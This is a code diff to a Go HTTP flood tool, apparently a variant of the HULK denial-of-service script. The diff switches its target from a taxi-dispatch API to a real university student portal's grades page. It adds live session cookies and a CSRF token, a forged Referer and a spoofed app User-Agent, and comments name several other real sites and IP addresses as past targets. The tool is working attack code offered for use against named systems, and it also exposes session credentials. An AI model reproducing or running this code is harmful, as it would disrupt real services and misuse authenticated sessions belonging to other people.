@@ -94,7 +94,7 @@ func main() {
 	// flag.StringVar(&site, "site", "https://elmakon.uz/elmakon", "Destination site.")
 
 	//arzoni bizda
-	flag.StringVar(&site, "site", "https://213.230.124.250:8089/driver_candidate_api/v1/settings", "Destination site.")
+	// flag.StringVar(&site, "site", "https://213.230.124.250:8089/driver_candidate_api/v1/settings", "Destination site.")
 
 	//hemis adu
 	// flag.StringVar(&site, "site", "https://student.adu.uz/test/exams?semester=14&_pjax=%23test-grid&_pjax=%23test-grid", "Destination site.")
@@ -103,7 +103,7 @@ func main() {
 	// flag.StringVar(&site, "site", "https://62.209.144.97:8090/driver_candidate_api/v1/settings", "Destination site.")
 
 	// flag.StringVar(&site, "site", "https://ru.dsr-corporation.com", "Destination site.")
-	// flag.StringVar(&site, "site", "https://student.adu.uz", "Destination site.")
+	flag.StringVar(&site, "site", "https://student.adu.uz/education/performance?semester=14&_pjax=%23admin-grid&_pjax=%23admin-grid", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
@@ -242,14 +242,14 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("User-Agent", "TMTaxiCaller/12.0.0-202110071112 (Xiaomi Redmi 8; Android 10; Scale/2.00)")
 		q.Header.Set("Cache-Control", "no-cache")
 		q.Header.Set("Accept-Charset", acceptCharset)
-		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
+		// q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
 		// q.Header.Set("Host", "relay.platform.taximaster.ru:8089")
 		q.Header.Set("Host", host)
-		// q.Header.Set("Referer", "https://student.adu.uz/education/subjects")
-		// q.Header.Set("X-CSRF-Token", "fju31d-3p4iD_FAOk9ecY6K9SqaKX3wREdF5r2LBCLgMY_-Btf2f2vfIYGLZjakJ6c8unroTO35flBXtOuxL9A==")
-		// q.Header.Set("Cookie", "_ga=GA1.1.1371172649.1645511335; week=0fc595e1389827a925f24d27ecd1781212dbe7705be86e7df85363953a21a009a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22week%22%3Bi%3A1%3Bs%3A5%3A%2276256%22%3B%7D; _ga_31T1HFVMCX=GS1.1.1646916759.5.0.1646916759.0; frontend=7i9u3vvtj12kvhann3s4nk27ln; _frontendUser=d4bed1f862d1935870ade4b792f53193151ac3e716cb4eadb5fe223cefca1ed2a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_frontendUser%22%3Bi%3A1%3Bs%3A48%3A%22%5B%223744%22%2C%22vn-iY_LVeK0nilycrHARhSchEqKp1irL%22%2C3600%5D%22%3B%7D; _csrf-frontend=814c9d76af0625c23ddf22b4a06c9fd181df37c6f421135f193f2e6d551dd0d3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%226KzU7n15jBWowWepYlGxQKWwI1_D1BTI%22%3B%7D")
+		q.Header.Set("Referer", "https://student.adu.uz/education/subjects")
+		q.Header.Set("X-CSRF-Token", "AcmBF5hUlWhQvqKc5mEl0j9R_n9hBj5sMdjZRTSfgk9L_s1H3xKjH2nzy_rWD3eNDRqsPldwRD51l7RwWK7sew==")
+		q.Header.Set("Cookie", "_ga=GA1.1.1371172649.1645511335; week=0fc595e1389827a925f24d27ecd1781212dbe7705be86e7df85363953a21a009a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22week%22%3Bi%3A1%3Bs%3A5%3A%2276256%22%3B%7D; _ga_31T1HFVMCX=GS1.1.1646916759.5.0.1646916759.0; frontend=uo1p7prcqagmn7h22se0pl0h3v; _frontendUser=3dc488f3f1788f1861767a28b3eeea762af4bea1ac6cbfb1ea3d9e89daa91e44a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_frontendUser%22%3Bi%3A1%3Bs%3A48%3A%22%5B%223744%22%2C%22vn-iY_LVeK0nilycrHARhSchEqKp1irL%22%2C3600%5D%22%3B%7D; _csrf-frontend=58c7b946fd1eb560c476f4c7cadfc58e72ea60166cc91acd33f1bd44005441c7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22J7LPGF6w9Mif0nR_2KRA6vzRDOm5l1n4%22%3B%7D")
 
 		// Overwrite headers with parameters
 
